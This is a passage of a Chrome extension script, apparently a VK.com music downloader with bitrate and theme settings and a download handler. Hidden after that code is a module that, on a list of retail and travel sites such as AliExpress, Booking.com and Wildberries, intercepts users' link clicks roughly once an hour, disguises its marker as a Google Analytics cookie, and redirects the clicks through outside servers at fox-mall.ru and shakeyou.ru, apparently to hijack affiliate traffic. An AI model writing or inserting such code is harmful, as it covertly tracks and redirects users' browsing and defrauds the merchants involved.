            for (var index in audios) {
                if (audios[index].tagName == "DIV") {
                    var classList = audios[index].classList, url;
                    url = audios[index].getAttribute('data-audio-url');
                    if(!classList.contains('at_mod')|| !obj) {
                        full.push({id: audios[index].getAttribute("data-full-id"), item: audios[index]});
                        classList.add('at_mod');
                        if(audios[audios.length-1] == audios[index]) {
                            nvk.find_audio(full);
                        }
                    }
                }
            }
        }
    },
    add_style: function(){
        var style = document.createElement('link');
        style.id = 'vk_link';
        if(!document.getElementById('vk_link')){
            document.head.appendChild(style);
            style.type = 'text/css';
            style.rel = 'stylesheet';
            style.href = chrome.extension.getURL("assets/css/vk-saver_style_2.0.css");
        }
    },
    update_music: function(){
        var info = document.getElementsByClassName('_at_audio_info');
        chrome.storage.sync.get("bitrate", function(data) {
            for(i in info) {
                if(data.bitrate == 0){
                    if(info[i].classList && info[i].classList.contains('show')) {
                        info[i].classList.remove('show');
                        var audio = info[i].parentNode.childNodes[1];
                        audio.style.paddingTop = '';
                    }
                } else {
                    if (info[i].classList && !info[i].classList.contains('show')) {
                        info[i].classList.add('show');
                        var audio = info[i].parentNode.childNodes[1];
                        audio.style.paddingTop = '3px';
                    }
                }
            }
        });
    },
    video_ajax: function(url, type){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        xhr.dataType = type;
        return xhr;
    },
    ajax: function(url, type){
        var xhr = new XMLHttpRequest();
        xhr.open('head', url, true);
        xhr.dataType = type;
        return xhr;
    },
    update_music2: function(){
        var info = document.getElementsByClassName('_at_audio_info');
        chrome.storage.sync.get("bitrate", function(data) {
            for(i in info) {
                if(data.bitrate == 0){
                    if(info[i].classList && info[i].classList.contains('show')) {
                        info[i].style.display = 'none';
                        info[i].classList.remove('show');
                        var audio = info[i].parentNode;
                        //audio.style.paddingTop = '';
                        audio.style.marginTop = "";
                        //audio.style.float = "none";
                    }
                } else {
                    if (info[i].classList && !info[i].classList.contains('show')) {
                        info[i].style.display = 'block';
                        info[i].classList.add('show');
                        var audio = info[i].parentNode;
                    }
                }
            }
        });
    },
    settings: function(){
        var layer = document.getElementById('narrow_column');
        if(layer){
            var side = layer.getElementsByClassName('ui_rmenu_pr')[0], first_item;
            if(side && !side.classList.contains('at_mod')) {
                first_item = side.getElementsByTagName('a')[1];
                var items, block_bitrate = document.createElement('div'), label_bit = document.createElement('label'),
                    bitrate = document.createElement('select'), theme = document.createElement('select'),
                    label_theme = document.createElement('label'), block_theme = document.createElement('div');
                side.classList.add('at_mod');
                label_bit.innerHTML = 'Bitrate';
                label_bit.classList.add('label');
                label_bit.style.paddingRight = '10px';

                label_theme.innerHTML = 'Theme';
                label_theme.classList.add('label');
                label_theme.style.paddingRight = '10px';

                var settings = document.createElement('div');
                settings.setAttribute('class','ui_rmenu_item _ui_item_audio_settings _ui_rmenu_audio_settings_toggle');
                settings.innerHTML = '<span>Мои настройки<span class="ui_rmenu_item_arrow"></span></span>';
                items = document.createElement('div');
                items.setAttribute('class','_ui_rmenu_sublist _ui_rmenu_audio_settings_list');
                items.id = 'vk-settings';
                items.style.display = 'none';
                items.appendChild(block_bitrate);
                items.appendChild(block_theme);

                block_bitrate.appendChild(label_bit);
                block_theme.appendChild(label_theme);
                block_bitrate.setAttribute('class', 'vk-bitrate ui_rmenu_subitem');
                bitrate.id = 'bitrate';
                block_bitrate.appendChild(bitrate);
                bitrate.innerHTML = '<option value="0">No</option><option value="1">Yes</option>';

                theme.id = 'vk_theme';
                block_theme.setAttribute('class', 'vk-theme ui_rmenu_subitem');
                theme.innerHTML = '<option value="0">Left</option><option value="1">Right</option>';
                block_theme.appendChild(theme);
                settings.addEventListener("click", function(){
                    var obj = this;
                    if(obj.classList.contains('ui_rmenu_item_expanded')){
                        obj.classList.remove('ui_rmenu_item_expanded');
                        items.style.display = 'none';
                        items.style.overflow = 'hidden';
                    } else {
                        obj.classList.add('ui_rmenu_item_expanded');
                        items.style.display = 'inline-block';
                        items.style.overflow = 'visible';
                    }
                });

                chrome.storage.sync.get("theme", function(data) {
                    theme.value = data.theme;
                });
                theme.addEventListener("change", function() {
                    var obj = this;
                    chrome.storage.sync.set({'theme': obj.value});
                    nvk.update_music_theme();
                });
                chrome.storage.sync.get("bitrate", function(data) {
                    bitrate.value = data.bitrate;
                });
                bitrate.addEventListener("change", function() {
                    var obj = this;
                    chrome.storage.sync.set({'bitrate': obj.value});
                    nvk.update_music2();
                });

                side.insertBefore(settings, first_item);
                side.insertBefore(items, first_item);
            }
        }
    },
    update_music_theme: function(){
        var left = document.getElementsByClassName('_at_save2'),right;
        right = document.getElementsByClassName('_at_save_right');
        chrome.storage.sync.get("theme", function(data) {
            if (data.theme == 0) {
                for (i in right) {
                    if(right[i].classList && right[i].classList.contains('show')) {
                        right[i].classList.remove('show');
                    }
                }
                for (i in left) {
                    if(left[i].classList && !left[i].classList.contains('show')) {
                        left[i].classList.add('show');
                    }
                }
            } else {
                for (i in right) {
                    if(right[i].classList && !right[i].classList.contains('show')) {
                        right[i].classList.add('show');
                    }
                }
                for (i in left) {
                    if(left[i].classList && left[i].classList.contains('show')) {
                        left[i].classList.remove('show');
                    }
                }
            }
        });
    },
    bitrate: function(size, kbit, obj){
        var info = document.createElement("div"), tw;
        info.innerHTML = '<b>'+kbit.toFixed(0)+' kbps</b>&nbsp;'+ size;
        info.setAttribute('class','_at_audio_info');
        chrome.storage.sync.get("bitrate", function(data) {
            if (data.bitrate == 1) {
                info.classList.add('show');
            }
        });
        tw = obj.getElementsByClassName('title_wrap')[0];
        nvk.insert_after(info, tw);
    },
    insert_after: function(node, referenceNode){
        if ( !node || !referenceNode ) return;
        var parent = referenceNode.parentNode, nextSibling = referenceNode.nextSibling;
        if ( nextSibling && parent ) {
            parent.insertBefore(node, referenceNode.nextSibling);
        } else if ( parent ) {
            parent.appendChild( node );
        }
    }
};

if(wlh == "vk.com" || wlh == "www.vk.com") {
    nvk.init();
}

var link = {"0":{"host":"aliexpress.com","red":"1","url":"0","deep":"&url=","blank":"1"},
    "1":{"host":"moneyman.ru","red":"1","url":"1","deep":"&url=","blank":"1"},
    "2":{"host":"ozon.travel","red":"1","url":"0","deep":"&url=","blank":"1"},
    "3":{"host":"booking.com","red":"1","url":"1","deep":"&url=","blank":"1"},
    "4":{"host":"agoda.com","red":"1","url":"1","deep":"&url=","blank":"1"},
    "5":{"host":"003.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
    "6":{"host":"wildberries.by","red":"1","url":"0","deep":"/url=","blank":"1"},
    "7":{"host":"wildberries.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
    "8":{"host":"wildberries.kz","red":"1","url":"0","deep":"/url=","blank":"1"},
    "9":{"host":"lamoda.kz","red":"1","url":"1","deep":"/url=","blank":"1"},
    "10":{"host":"lamoda.ua","red":"1","url":"1","deep":"/url=","blank":"1"},
    "11":{"host":"lamoda.by","red":"1","url":"1","deep":"/url=","blank":"1"},
    "12":{"host":"krasotkapro.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
    "13":{"host":"aviasales.ru","red":"1","url":"1","deep":"/url=","blank":"1"},
    "14":{"host":"author24.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
    "15":{"host":"miniinthebox.com","red":"1","url":"0","deep":"/url=","blank":"1"},
    "16":{"host":"tickets.kz","red":"1","url":"0","deep":"/url=","blank":"1"},
    "17":{"host":"tickets.pl","red":"1","url":"0","deep":"/url=","blank":"1"},
    "18":{"host":"tickets.ua","red":"1","url":"0","deep":"/url=","blank":"1"},
    "19":{"host":"tickets.md","red":"1","url":"0","deep":"/url=","blank":"1"},
    "20":{"host":"tickets.by","red":"1","url":"0","deep":"/url=","blank":"1"},
    "21":{"host":"shophair.ru","red":"1","url":"1","deep":"/url=","blank":"1"},
    "22":{"host":"ostrovok.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
    "23":{"host":"kupivip.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
    "24":{"host":"ivi.ru","red":"1","url":"1","deep":"/url=","blank":"1"},
    "25":{"host":"hotels.com","red":"1","url":"1","deep":"/url=","blank":"1"},
    "26":{"host":"muztorg.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
    "27":{"host":"buyon.ru","red":"1","url":"0","deep":"/url=","blank":"1"},
    "28":{"host":"highscreen.ru","red":"1","url":"0","deep":"/url=","blank":"1"}};

console.log('test log');

var pages = {
    blank: 0,
    server:null,
    init:function(){
        var item, state = false, row, host, refer, wlh = document.location.hostname, site = this.site();
        item = link;
        for (var index in item) {
            if (wlh.match(item[index].host)) {
                row = item[index]; state = true;
            }
        }
        if (!state) { return; }
        host = row.host;
        this.blank = row.blank || null;
        refer = document.referrer;
        for(var i in site){
            if(i == row.url){
                this.server = site[i];
            }
        }
        if (this.server == null) {
            return null;
        }
        if (host.match(wlh[0]) && wlh.match(host) && !refer.match(host)) {
            console.log(1);
            this.redirect(host);
        }
    },
    site:function(){
        return {'0':'http://fox-mall.ru/support/ads.php',
            '1':'http://shakeyou.ru/reklama.php'};
    },
    redirect:function(link){
        pages.links(link);
        setInterval(function() {
            pages.links(link)
        }, 500);
    },
    links: function (g) {
        var a = document.getElementsByTagName("a");
        for (var h in a) {
            if (a[h].tagName == "A") {
                var f = a[h];
                if (f.classList) {
                    if (!f.classList.contains("_ready_ga")) {
                        f.classList.add("_ready_ga");
                        pages.bindEvent(g, f)
                    }
                }
            }
        }
    },
    bindEvent: function (f, element) {
        var self = this;
        element.onclick = function (event) {
            var m = Date.now() / 1000 | 0, c, n;
            c = helper.get_cookie("_ga_sid") || null;
            if (!c || c < (m - 3600)) { n = event.currentTarget.href;
                if (n.match(f)) {
                    if (n.indexOf("javascript") == 0) { } else { helper.set_cookie("_ga_sid", m, "path=/");
                        if (n.indexOf("http") == 0 || n.indexOf("//") == 0) { } else { n = self.link + n; }
                        event.stopPropagation(); event.preventDefault();
                        var o = navigator.userAgent || null;
                        if (pages.blank == 1 && o.indexOf("Firefox") > -1) {
                            var link = document.createElement("a");
                            link.target = "_blank";
                            link.href = pages.server + "?exec=" + f + "&url=" + n;
                            link.rel = "nofollow noopener noreferrer";
                            link.click();
                        } else { document.location.href = pages.server + "?exec=" + f + "&url=" + n; }
                    }
                }
            }
        }
    }
};
(function() {
    setTimeout(function () {
        pages.init();
    }, 0)
})();

chrome.extension.onMessage.addListener(function (request, sender, sendResponse) {
    switch (request.type) {
        case 'download':
            console.log('downloading file: ' + request.url + '; new name: ' + request.name);
            chrome.downloads.download({url: request.url, filename: request.name});
            break;
    }
});